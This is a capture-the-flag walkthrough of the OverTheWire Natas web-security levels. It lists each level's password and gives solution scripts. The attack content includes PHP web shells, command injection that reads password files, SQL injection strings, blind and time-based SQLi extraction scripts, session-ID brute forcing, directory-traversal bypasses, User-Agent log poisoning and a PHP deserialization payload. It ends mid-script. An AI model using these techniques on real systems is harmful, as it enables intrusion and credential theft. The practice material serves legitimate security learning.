# Natas

## Natas Level 0

Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org

solution **Inspecting element and viewing comment**

password :- `gtVrDuiDfck831PqWsLEZy5gyDz1clto`

----------

## Natas Level 0 → Level 1

Username: natas1
URL:      http://natas1.natas.labs.overthewire.org

solution **Inspecting window and viewing element comment**

passsword :- `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

----------

## Natas Level 1 → Level 2

Username: natas2
URL:      http://natas2.natas.labs.overthewire.org

solution **Console show password**

password :- `bmF0YXMyOlpsdXJ1QXRoUWs3UTJNcW1EZVRpVWlqMlp2V3kybUJp`

solution **search pixel file url and go to files then get everything**

> data inside file :- {
username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
}


password :- `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

----------

## Natas Level 2 → Level 3

Username: natas3
URL:      http://natas3.natas.labs.overthewire.org

solution **check /robots.txt**

password :- `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

----------

## Natas Level 3 → Level 4

Username: natas4
URL:      http://natas4.natas.labs.overthewire.org

Hind :- Headers

solution **Create request with custom header refer (from where the request is coming)**

code 
```bash
curl 'http://natas4.natas.labs.overthewire.org/index.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' -H 'Connection: keep-alive' -H 'Referer: http://natas5.natas.labs.overthewire.org/' -H 'Cookie: __utma=176859643.852469247.1618763012.1618839926.1618904294.3; __utmz=176859643.1618763012.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=176859643.3.10.1618904294; __utmc=176859643; __utmt=1' -H 'Upgrade-Insecure-Requests: 1'
```

password :- `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

----------

## Natas Level 4 → Level 5

Username: natas5
URL:      http://natas5.natas.labs.overthewire.org

hint :- Cookie

solution **change cookie value**

password :- `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

----------

## Natas Level 5 → Level 6

Username: natas6
URL:      http://natas6.natas.labs.overthewire.org

hind :- php exploit

### Approach

in source code the function is calling includes/secret.inc for password

so just open it by requesting on it `http://natas6.natas.labs.overthewire.org/includes/secret.inc` Check its source code

### Pasword for Level 6 - 7

7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

----------

## Natas Level 6 → Level 7

Username: natas7
URL:      http://natas7.natas.labs.overthewire.org

### Hint

change `query` parameter

query means query in url like ?page or ?search

### Approach

password is at /etc/natas_webpass/natas8 and we cannot access it directly.

but we can use {url}/index.php?page=/etc/natas_webpass/natas8 to get password


### Password for Level 7 - 8

DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 

----------

## Natas Level 7 → Level 8

Username: natas8
URL:      http://natas8.natas.labs.overthewire.org

### Data

encodedSecret = "3d3d516343746d4d6d6c315669563362"

### Hints

Data decrption

### Approach

In source code encodedSecret is 3d3d516343746d4d6d6c315669563362

which is encrypted with bin2hex then reversed then base64 encryption

[bin2hex decrypt from here](https://encode-decode.com/bin2hex-decode-online/)

[String Reversed Here](https://codebeautify.org/reverse-string)

```bash
echo b3ViV1lmMmtCcQ== | base64 -d 	# For base64 decryption
```

### Password for Level 8 - 9

W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

----------

## Natas Level 8 → Level 9

Username: natas9
URL:      http://natas9.natas.labs.overthewire.org

### Approach

With source code it was clear that name is directly passing to bash without check

and it previous level we have found out that all password are stored in /etc/natas_webpass/natas*

```bash
; pwd 	# For check 

; cat /etc/natas_w*/n*10
```

### Password for Level 9 - 10

nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

----------

## Natas Level 9 → Level 10

Username: natas10
URL:      http://natas10.natas.labs.overthewire.org

### Hint

Break through grep command ( but we dont need to break it )

### Approach

In this problem we cannot execute command but grep can search through many files within the same command



```bash
a /etc/nata*/nata*	# Checking if works 

# last command return password for only natas10 that means in natas11 password char 'a' is not included

1 /etc/nata*/nata*	# Checking if 1 is included in password
```

### Password for Level 10 - 11

U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

----------

## Natas Level 10 → Level 11

Username: natas11
URL:      http://natas11.natas.labs.overthewire.org

### Approach

Taking cookie default data `data:"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"`
data:"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"

data:"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"
	
` setcookie("data", base64_encode(xor_encrypt(json_encode($d))));`

first cookie is base64_encode 
then xor_excrypt
then json_encode

1. base64_decode can be done with 
```python
import base64, urllib
data = ""
print(base64.b64.decode(urllib.unqoute(data)).encode('hex'))
```

2. In the xor_excrypt they are using key to find that we have to do reverse engineering in php with (a^b=c,a^c=b)

3. json_encode 


First base64decode cookie data then convert it into hex to pass it to php then
 


### Password for Level 11 - 12

EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

----------

## Natas Level 11 → Level 12

Username: natas12
URL:      http://natas12.natas.labs.overthewire.org

### Approach

changed file name in form request and uploaded file with injection

```php
<?
echo shell_exec("cat /etc/natas_webpass/natas13 ");
?>
``` 

#### Best file

```php
<?php
	echo(system($_GET['c']));
?>
```

now you can execute any command with `url/filename.php?c={command here}` by which we can execute as many commands as we want


### Password for Level 12 - 13 

jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 

----------

## Natas Level 12 → Level 13

Username: natas13
URL:      http://natas13.natas.labs.overthewire.org

### Approach

Just find exif_imagetype bypass and found (this.)[https://stackoverflow.com/questions/18357095/how-to-bypass-the-exif-imagetype-function-to-upload-php-code]

```python3
fh = open('shell.php', 'wb')
fh.write(b'\xFF\xD8\xFF\xE0' + b'<? passthru($_GET["cmd"]); ?>')
fh.close()
```

and upload shell.php by changing name in form with developer tools

### Password for level 13 - 14

Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

----------

## Natas Level 13 → Level 14

Username: natas14
URL:      http://natas14.natas.labs.overthewire.org

### Approach

Just used SQL injection 

```bash
username=natas15
password=" or 1=1 -- "
```

### Password for Level 14 - 15

AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J


## Natas Level 14 → Level 15

Username: natas15
URL:      http://natas15.natas.labs.overthewire.org

### Approach 

Checked if password field works

```bash
username=natas16" and password='' or 1=1 #"
```

Now just need to get query result

If we POST request with data `url?debug=true` then we can get out if working

we can do blind injection with python script

```python
#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth
# import strings
from string import ascii_lowercase, ascii_uppercase
import re

url = "http://natas15.natas.labs.overthewire.org/index.php"

user = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

auth = HTTPBasicAuth(user, password)

all_letters = ascii_lowercase + ascii_uppercase + "".join([str(i) for i in range(10) ])
print(all_letters)
# r = requests.get(url , auth=HTTPBasicAuth(user, password))

# print(url)
# r = requests.get(url)
password_letters = []
loopend = False
while True:
	for letter in all_letters:

		# payload = {'username': 'natas16" and password LIKE "{letters}%" #"'.format(letters="".join(password_letters)+letter)}
		payload = {'username': 'natas16" and password LIKE BINARY "{letters}%" #"'.format(letters="".join(password_letters)+letter)}
		# payload = {'username': 'natas16" and password COLLATE SQL_Latin1_General_CP1_CS_AS LIKE "{letters}%" #"'.format(letters="".join(password_letters)+letter)}
		# payload = {'username': 'natas16" and password (%STARTSWITH \'{letters}\') #"'.format(letters="".join(password_letters)+letter)}
		# payload = {'username': f'natas16" and password="{1 + 2}" or 1=1 #"'}
		r = requests.post(url + "?debug=true", auth=auth, data=payload)

		pattern = "This user (\w+)"
		result = re.findall(pattern, r.text)
		# print(r.text)

		if result[0] == "exists":
			password_letters.append(letter)
			# print(letter)
			print(password_letters)
			break
		else:
			print("failed ", letter, re.findall(pattern, r.text))
			if letter == "9":
				loopend = True

			continue

	if loopend == True:
		break
	# print(password_letters)
	# break

		# result = re.findall(pattern, r.text)
# print(result)


print("".password_letters)
``` 

SELECT Name FROM Sample.MyTest WHERE Name %STARTSWITH 'M'
SELECT Name FROM Sample.MyTest WHERE Name LIKE 'M%'	# Check if start with M without case sensitivity
SELECT Name FROM Sample.MyTest WHERE Name LIKE BINARY 'M%'	# Check if start with M with case sensitivity

### Password for Level 15 - 16

WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

----------

## Natas Level 15 → Level 16

Username: natas16
URL:      http://natas16.natas.labs.overthewire.org


### Hint

$()

nested grep inside grep 

### Approach

```bash
# Cheated
grep ^a /etc/natas_webpass/
```

```python
#!/usr/bin/env python3
import requests, re, string
from requests.auth import HTTPBasicAuth

letters = string.ascii_lowercase + string.ascii_uppercase + "".join([str(i) for i in range(10)])

user = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
url = "http://natas16.natas.labs.overthewire.org/index.php"

lst = [""]
stop = False

while True:

	for letter in letters:
		auth = HTTPBasicAuth(user, password)
		word = "".join(lst)
		r = requests.get(url + "?needle=doomed" + f"$(grep ^{word + str(letter)} /etc/natas_webpass/natas17)", auth=auth)
		# print(r.text)
		pattern = "<pre>\n((.|\n)*)<\/pre>"
		result = re.findall(pattern, r.text)
		print("".join(lst), letter, " ", result)

		if result == [('', '')]:
			lst.append(letter)
			print("list", lst)
			break

		if letter == 9:
			stop = True

	if stop:
		break

print("Password = ", "".join(lst))

# Password = 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

### Password for Level 16 - 17

8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

----------

## Natas Level 16 → Level 17

Username: natas17
URL:      http://natas17.natas.labs.overthewire.org

### Hint

use SQL sleep and SQL IF Else

### Approach

Trying to request with debug=true and user=natas18

# https://blog.pythian.com/mysql-injection-sleep/

Just done it with sleep function

```python
payload = f"\" OR 1=1 AND sleep(1)#"	# To check if vulnerable
```

```python
#!/usr/bin/env python3
import requests, re, string
from requests.auth import HTTPBasicAuth
from time import time

letters = string.ascii_lowercase + string.ascii_uppercase + "".join([str(i) for i in range(10)])

user = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
url = "http://natas17.natas.labs.overthewire.org/index.php"

lst = []
stop = False
auth = HTTPBasicAuth(user, password)

# payload = "'%nomatch' OR sleep(1100) AND '1%'"

# print(r.text)
while True:

	for letter in letters:
		word = "".join(lst)
		# r = requests.get(url + "?needle=doomed" + f"$(grep ^{word + str(letter)} /etc/natas_webpass/natas17)", auth=auth)
		payload = f"\" OR 1=1 AND password LIKE BINARY \"{word + str(letter)}%\" AND sleep(1.5)#"
		# payload = f"\" OR 1=1 AND sleep(1)#"
		start_time = time()
		r = requests.post(url + "?debug=true" , auth=auth, data= {"username": payload})
		# print(r.text)
		end_time = time() - start_time
		# print(r.text)
		# print(end_time)
		# pattern = "<pre>\n((.|\n)*)<\/pre>"
		# result = re.findall(pattern, r.text)
		# print("".join(lst), letter, " ", result)
		print("".join(lst), letter, end_time)

		# Something Due to traffic time > 2sec which return wrong password
		if 2 > end_time > 1.5 :
			lst.append(letter)
			print("list", lst)
			break

		if letter == letters[-1]:
			stop = True

	if stop == True:
		break

print("Password = ", "".join(lst))

# Password = xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

### Password for Level 17 - 18

xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

---------

## Natas Level 17 → Level 18

Username: natas18
URL:      http://natas18.natas.labs.overthewire.org

### Approach

Tryied random sessions pssid with python script and found 119 as answer

```python
#!/usr/bin/env python3
import requests, re, string
from requests.auth import HTTPBasicAuth
from time import time

letters = string.ascii_lowercase + string.ascii_uppercase + "".join([str(i) for i in range(10)])

user = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
url = "http://natas18.natas.labs.overthewire.org/index.php"

lst = []
stop = False
auth = HTTPBasicAuth(user, password)


s = requests.Session()
s.auth = (user, password)

for i in range(600):

	r = s.post(url, cookies={"PHPSESSID": str(i)}, data={"admin": str(i), "username": "natas19", "password": "password"})

	# print(r.text)
	print(i)

	pattern = "You are an admin."
	result = re.findall(pattern, r.text)
	if len(result) > 0:
		print(result)
		print(r.text)
		break

print(re.findall("Password:(.*)</pre>", r.text))

# password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
```

### Password for level 18 - 19

4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

----------

## Natas Level 18 → Level 19

Username: natas19
URL:      http://natas19.natas.labs.overthewire.org

### Approach

Noticed random generated PHPSESSID and they are using `2d61646d696e` at the end

```python
PHPSESSID:"3331302d61646d696e"
PHPSESSID:  "32322d61646d696e"
PHPSESSID:"3138302d61646d696e"
PHPSESSID:"3130372d61646d696e"
PHPSESSID:"3438332d61646d696e"
PHPSESSID:"3537372d61646d696e"
		  3536342d6e617461733139
```

typing to request with "{number}2d61646d696e"

this follows patter `3x3x3x{commanpart}`

Failed the above Method failed


```python
# Failed
```

`353634 2d 6e617461733139` that 2d means this string could be in hex and be can decode it.

```python
>>> bytes.fromhex('3536342d6e617461733139').decode('utf-8')
'564-natas19'
```

script actually worked i was just sending as user natas19 where i should have send request as admin username in data

```python
#!/usr/bin/env python3
import requests, re, string
from requests.auth import HTTPBasicAuth
from time import time

letters = string.ascii_lowercase + string.ascii_uppercase + "".join([str(i) for i in range(10)])

user = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
url = "http://natas19.natas.labs.overthewire.org/index.php"

lst = []
stop = False
auth = HTTPBasicAuth(user, password)


s = requests.Session()
s.auth = (user, password)


def get_session_id(cookie):
	cookie = str(r.cookies)
	pattern = "PHPSESSID=((\d|\w)*)"
	cookie_phpsessid = re.findall(pattern, cookie)[0][0]
	return cookie_phpsessid


session_ids = []
# At this time i didn't know that comman part was username in hex
# Getting PHPSESSID current PHPSESSID's
for i in range(10):
	s = requests.Session()
	s.auth = (user, password)

	r = s.post(url, cookies={"PHPSESSID": str(i) }, data={"username": "admin", "password": "password"})

	cookie_phpsessid = get_session_id(r.cookies)
	session_ids.append(cookie_phpsessid)

# extracting Comman part and vertifing
check = True
old_session_comman = session_ids[0][6:]
for i in session_ids:
	print(i)
	session_comman = i[6:]
	print(session_comman)
	if old_session_comman != session_comman: 
		check = False
	else: 
		continue


session_ids = []
for i in range(999):
	s = requests.Session()
	s.auth = (user, password)

	# converting i in to 3x3x3x
	x = str(i).zfill(3)
	number = (f"3{x[0]}3{x[1]}3{x[2]}")
	print(number + session_comman)

	# r = s.post(url, cookies={"PHPSESSID": str(i)[-1] + session_comman }, data={"username": "natas19", "password": "password"})
	r = s.post(url, cookies={"PHPSESSID": number + session_comman }, data={"username": "admin", "password": number})

	print(r.text)
	print(number, r.cookies, s.cookies)
	# print(get_session_id(r.cookies))
	# if str(i) + session_comman == get_session_id:
	# 	session_ids.append(i)
	# else:
	# 	print(str(i) + session_comman, get_session_id(r.cookies))
	# print(session_ids)

	pattern = "You are an admin."
	result = re.findall(pattern, r.text)
	if len(result) > 0:
		print(result)
		print(r.text)
		break

print(re.findall("Password:(.*)</pre>", r.text)[0])

# Password = eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```

Better if we have just send request with by converting PHPSESSION from hex like {number}-{user}

### Password for level 19 - 20

eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

----------

## Natas Level 19 → Level 20

Username: natas20
URL:      http://natas20.natas.labs.overthewire.org

### Approach

It is writing `name` in file `mysession_{sid}` and can be injected payloaded as `{name} {id}`

and retriving `name` from file `mysession_{sid}` if debug requery in request

we can send payload to replace name and log in as admin 

[this](https://securitytimes.wordpress.com/2017/07/09/natas20-21/) will explian it in detail

```
admin
admin 1
```

```
# Encoded payload
admin%0Aadmin%201
```

```bash
# Sending Payload
curl 'http://natas20.natas.labs.overthewire.org/index.php?debug=true' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://natas20.natas.labs.overthewire.org' -H 'DNT: 1' -H 'Authorization: Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg==' -H 'Connection: keep-alive' -H 'Referer: http://natas20.natas.labs.overthewire.org/index.php?debug=true' -H 'Cookie: PHPSESSID=1; admin=1' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'name=admin%0Aadmin%201'
```

```bash
# Getting Credentials
curl 'http://natas20.natas.labs.overthewire.org/index.php?debug=true' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://natas20.natas.labs.overthewire.org' -H 'DNT: 1' -H 'Authorization: Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg==' -H 'Connection: keep-alive' -H 'Referer: http://natas20.natas.labs.overthewire.org/index.php?debug=true' -H 'Cookie: PHPSESSID=1; admin=1' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'name=1'
```

### Password for level 20 - 21

IFekPyrQXftziDEsUr3x21sYuahypdgJ

----------

## Natas Level 20 → Level 21

Username: natas21
URL:      http://natas21.natas.labs.overthewire.org

### Approach

This website uses colocated (share resources with other), which mean sid for 1 site may work for other

we can set our session as values of other site (i.e., align, fontsize, bgcolor data )+ this site (admin data) and use other site to set session data with admin parameter with our value

```bash
# Setting data
curl 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://natas21-experimenter.natas.labs.overthewire.org' -H 'DNT: 1' -H 'Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==' -H 'Connection: keep-alive' -H 'Referer: http://natas21-experimenter.natas.labs.overthewire.org/?debug' -H 'Cookie: PHPSESSID=mmpljoqoset48n972kcvji9136' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'align=center&fontsize=150%25&bgcolor=yellow&admin=1&submit=Update'
```

```bash
# Retriving data
curl 'http://natas21.natas.labs.overthewire.org/' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=mmpljoqoset48n972kcvji9136' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
```

### Password for level 21 - 22

chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

----------

## Natas Level 21 → Level 22

Username: natas22
URL:      http://natas22.natas.labs.overthewire.org

### Approach

If thier is no session with admin = 1 then it is sending request back to '/'

may need to intercept request and then send with query `revelio`

Can check response with burp interception or with curl command

```bash
curl 'http://natas22.natas.labs.overthewire.org/?revelio' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Authorization: Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg==' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=b173fbfd26ggv8ig14m0929g87' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
```

### Password for level 22 - 23

D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

----------

## Natas Level 22 → Level 23

Username: natas23
URL:      http://natas23.natas.labs.overthewire.org

### Approach

Need to send GET request with password containing "iloveyou" and > 10 words i.e., `11iloveyou`

```python
#!/usr/local/bin/env python3
import requests, re, string
import sys

user = "natas23"
password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"

url = f"http://{user}:{password}@{user}.natas.labs.overthewire.org/"

payload = "11iloveyou"

r = requests.get(url + f"/?passwd={payload}")

print(re.findall("Password: ((\d|\w)*)", r.text)[0][0])
```

### Password for level 23 -24

OsRmXFguozKpTZZ5X14zNO43379LZveg

----------

## Natas Level 23 → Level 24

Username: natas24
URL:      http://natas24.natas.labs.overthewire.org


### Approach

It is using `strcmp` to compare string which can be exploited by sending it as array. 

[For more detail](https://www.programmersought.com/article/66221929636/)


```python
#!/usr/local/bin/env python3
import requests, re, string
import sys

user = "natas24"
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"

url = f"http://{user}:{password}@{user}.natas.labs.overthewire.org/"

payload = "paylaod"

r = requests.get(url + f"/?passwd[]={payload}&debug")

# print(r.text)
print(re.findall("Password: ((\d|\w)*)", r.text)[0][0])
```

### Password for level 24 - 25

GHF6X7YwACaYYssHVY05cFq83hRktl4c

----------

## Natas Level 24 → Level 25

Username: natas25
URL:      http://natas25.natas.labs.overthewire.org

### Approach

Using strstr for restricting Directory Traversal

which can be bypass using `..././` instead of `../`

checking with `?lang=..././language/de` and it worked in web browser

`?lang=..././language/..././..././..././..././..././..././etc/natas_webpass`
`?lang=..././language/..././..././..././..././..././..././etc/natas_webpa*ss/natas25`


[Read more here](https://www.exploit-db.com/exploits/48595) 

```
logfile_url = "?lang=..././logs/natas25_" + sid + ".log"
```

It is checking session_id() which will execute useragent so we can send useragent by burp interception as `<? readfile("/etc/natas_webpass/natas26") ?>` to run command  and then read log file


```
Cookie: PHPSESSID=ldt4hrft17gc80sae2ekbpobo0
```

```bash
# Payload request

GET /?lang=natas_webpass HTTP/1.1
Host: natas25.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
Upgrade-Insecure-Requests: 1
User-Agent: <? readfile("/etc/natas_webpass/natas26") ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas25.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ldt4hrft17gc80sae2ekbpobo0
Connection: close
```

```bash
# Open log file

GET /?lang=..././logs/natas25_ldt4hrft17gc80sae2ekbpobo0.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
Upgrade-Insecure-Requests: 1
User-Agent: <? readfile("/etc/natas_webpass/natas26") ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas25.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ldt4hrft17gc80sae2ekbpobo0
Connection: close
```

```
# Password
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```

or This script can be use to do all steps with one script

```python
#!/usr/local/bin/env python3
import requests, re, string
import sys

user = "natas25"
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

url = f"http://{user}:{password}@{user}.natas.labs.overthewire.org/"

# s = requests.session()

sid = "u36cm29g6djnigdl5l6o3dkh85"

# ?lang=..././language/de
payload = "?lang=..././language/de"

r = requests.get(url + f"{payload}", cookies={"PHPSESSID": sid})

print(r.cookies)

# for cookie in r.cookies:
# 	sid = cookie.value

user_agent_payload = '<? readfile("/etc/natas_webpass/natas26") ?>'

logfile_path = "?lang=..././logs/natas25_" + sid + ".log"

r2 = requests.get(url + f"{logfile_path}", headers={'User-Agent': user_agent_payload}, cookies={"PHPSESSID": sid})

print(r2.text)
```
### Password for level 25 - 26

oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

----------

## Natas Level 25 → Level 26

Username: natas26
URL:      http://natas26.natas.labs.overthewire.org

### Approach

I think Logger function is not getting called , means no log

and they are just storing data with base64 in `img/natas26_{sid}.png` without any filteration

and by passing random data it is not createing.

If cookie `drawing` is present then it will execute data from it.

```php
<?php
	# Checking data from cookie
	$drawing = unserialize(base64_decode("YTo4OntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMyI7czoyOiJ4MiI7czoxOiI0IjtzOjI6InkyIjtzOjE6IjMiO31pOjE7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czoxOiIxIjtzOjI6InkyIjtzOjE6IjEiO31pOjI7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjI4IjtzOjI6IngyIjtzOjI6IjM4IjtzOjI6InkyIjtzOjM6IjMyMSI7fWk6MzthOjQ6e3M6MjoieDEiO3M6MjoiMTAiO3M6MjoieTEiO3M6MjoiMjgiO3M6MjoieDIiO3M6MjoiMzgiO3M6MjoieTIiO3M6MzoiMzIxIjt9aTo0O2E6MDp7fWk6NTthOjA6e31pOjY7YTowOnt9aTo3O2E6NDp7czoyOiJ4MSI7czoxMjoiaGVsbG8gd29ybGQxIjtzOjI6InkxIjtzOjEyOiJyYW5kb20gd29yZDIiO3M6MjoieDIiO3M6MTE6Im5hbWUgd29yZCAzIjtzOjI6InkyIjtzOjg6ImxvY2F0ZSA0Ijt9fQ"));
	print_r($drawing);
?>
```

now can exploit cookie data by sending

cheated
```php
<?php
	// Creating payload
	class Logger {
	    private $logFile;
	    private $initMsg;
	    private $exitMsg;
	    
	    function __construct(){
	        $this->initMsg="heyyyyyy\n";
	        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
	        $this->logFile = "/var/www/natas/natas26/img/n1.txt";
	    }
	}

	$o = new Logger();
	print base64_encode(serialize($o))."\n";

	// text_base64 = Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozMzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbjEudHh0IjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6OToiaGV5eXl5eXkKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjM6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+CiI7fQ==

	// php_base64 = Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozMzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbjEudHh0IjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6OToiaGV5eXl5eXkKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjM6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+CiI7fQ==

?>
```

### Password for level 26 - 27

55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ

----------

## Natas Level 26 → Level 27

Username: natas27
URL:      http://natas27.natas.labs.overthewire.org

### Approach

checking credentials with `mysql_real_escape_string` which may can be bypassed with `%` 

```
1' OR '1'='1
1%20OR%201%3D1
```

[Read more here](https://forums.hak5.org/topic/38466-bypass-mysql_real_escape_string/)

```
# Inside username
natas28%ef' OR 1=1
```

nat
natas28

Query also restricted for new user i.e., `createUser` function

failed all method till now

### Hint

from dumpData loop create new natas28

### Worked

sending `natas28++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++1` with burp, `+` for spaces for exploiting sql char limit set

and password empty

and it will create user natas28 and 1 with password empty

and while login as natas28 it will return password

[read here more detail](https://n0j.github.io/2017/07/20/otw-natas-27.html)

### Password for level 27 - 28

JWwR438wkgTsNKBbcJoowyysdM82YjeF

----------

## Natas Level 27 → Level 28

Username: natas28
URL:      http://natas28.natas.labs.overthewire.org

### Approach

sending query with PKCS#7 cryptography aka., Cryptographic Message Syntax

```
Incorrect amount of PKCS#7 padding for blocksize
```

Checking for minimum length of blocksize, i.e., 60


```python
#!/usr/local/bin/python3

import requests, re

user = "natas28"
